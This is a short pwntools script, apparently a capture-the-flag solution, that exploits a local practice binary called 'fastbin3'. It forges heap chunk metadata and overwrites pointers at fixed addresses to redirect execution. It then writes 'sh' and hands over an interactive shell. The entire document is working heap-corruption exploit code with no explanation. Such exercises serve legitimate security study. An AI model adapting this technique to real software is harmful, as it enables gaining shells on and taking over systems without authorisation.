#!/usr/bin/env python
from pwn import *
p = process('./fastbin3')
elf = ELF('./fastbin3')
p.sendline('push')
p.sendline(str(0x41))
p.sendline('DEADBEEF1')

p.sendline('pop')
p.sendline('pop'.ljust(128-32) + p64(0) + p64(96|1) + p64(0) + p64(0x402110)[:-1])

p.sendline('push')
p.sendline('88')
p.sendline('A'*80 + p64(0x402028)[:-1])

p.sendline('sh\x00'.ljust(8) + p64(0x400730))

p.interactive()
